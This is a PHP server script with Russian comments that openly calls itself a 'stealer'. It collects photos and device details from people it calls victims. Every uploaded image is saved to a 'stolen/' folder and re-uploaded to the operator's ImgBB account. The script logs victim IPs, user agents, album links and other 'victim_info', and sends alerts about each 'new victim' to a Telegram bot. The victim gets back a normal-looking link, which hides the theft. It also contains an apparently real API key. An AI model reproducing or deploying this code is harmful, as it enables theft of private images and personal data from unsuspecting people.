<?php
// ========== НАСТРОЙКИ ==========
$IMGBB_API_KEY = 'd0d498d742931aed3626d5b32c081df3'; // ТВОЙ ключ ImgBB
$STORAGE_DIR = 'stolen/';
$LOG_FILE = 'stolen.log';
$TELEGRAM_BOT = '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'; // ТГ бот (опционально)
$TELEGRAM_CHAT = '123456789'; // Твой chat_id
// ===============================

// Создаём папки
if (!is_dir($STORAGE_DIR)) mkdir($STORAGE_DIR, 0755, true);

// Логирование
function logMessage($type, $data) {
    global $LOG_FILE, $TELEGRAM_BOT, $TELEGRAM_CHAT;
    $entry = [
        'time' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'type' => $type,
        'data' => $data
    ];
    file_put_contents($LOG_FILE, json_encode($entry, JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
    
    // Отправка в Telegram
    if ($TELEGRAM_BOT && $TELEGRAM_BOT !== '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz') {
        $msg = "📸 НОВАЯ ЖЕРТВА!\nIP: {$entry['ip']}\nВремя: {$entry['time']}\nТип: $type\nДанные: " . substr(print_r($data, true), 0, 500);
        file_get_contents("https://api.telegram.org/bot{$TELEGRAM_BOT}/sendMessage?chat_id={$TELEGRAM_CHAT}&text=" . urlencode($msg));
    }
}

// Обработка GET (логи альбомов и инфы)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['info'])) {
        $info = json_decode(urldecode($_GET['info']), true);
        logMessage('victim_info', $info);
        die('ok');
    }
    if (isset($_GET['log_album'])) {
        logMessage('album_link', urldecode($_GET['log_album']));
        die('ok');
    }
    die('stealer ready');
}

// Обработка POST (загрузка фото)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $file = $_FILES['image'];
    $originalName = $file['name'];
    $tmpPath = $file['tmp_name'];
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Сохраняем оригинал на сервере
    $savedName = time() . '_' . bin2hex(random_bytes(8)) . '_' . basename($originalName);
    $savedPath = $STORAGE_DIR . $savedName;
    copy($tmpPath, $savedPath);
    
    // Загружаем на ImgBB (твой аккаунт)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.imgbb.com/1/upload?key={$IMGBB_API_KEY}");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['image' => new CURLFile($tmpPath)]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $imgbbUrl = null;
    if ($httpCode === 200 && $response) {
        $json = json_decode($response, true);
        if (isset($json['data']['url'])) {
            $imgbbUrl = $json['data']['url'];
        }
    }
    
    // Логируем
    logMessage('photo', [
        'original_name' => $originalName,
        'saved_as' => $savedName,
        'imgbb_url' => $imgbbUrl,
        'size' => $file['size'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
    ]);
    
    // Возвращаем ссылку жертве (можно подменить на любую)
    header('Content-Type: application/json');
    if ($imgbbUrl) {
        echo json_encode(['success' => true, 'url' => $imgbbUrl]);
    } else {
        // Если ImgBB не ответил — отдаём ссылку на свою копию
        $fakeUrl = "https://" . $_SERVER['HTTP_HOST'] . "/" . $STORAGE_DIR . $savedName;
        echo json_encode(['success' => true, 'url' => $fakeUrl]);
    }
    exit();
}

// Если ничего не подошло
http_response_code(400);
echo json_encode(['error' => 'invalid request']);
?>